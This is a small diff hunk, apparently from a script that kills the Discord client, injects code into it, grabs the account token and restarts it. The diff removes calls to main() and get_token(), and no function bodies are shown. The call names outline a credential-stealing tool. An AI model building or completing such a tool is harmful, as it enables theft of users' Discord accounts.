@@ -792,8 +792,7 @@ kill_discord()
 
 inject_into_discord()
 
-main() 
-
-get_token()
-
 start_discord()
+
+
+
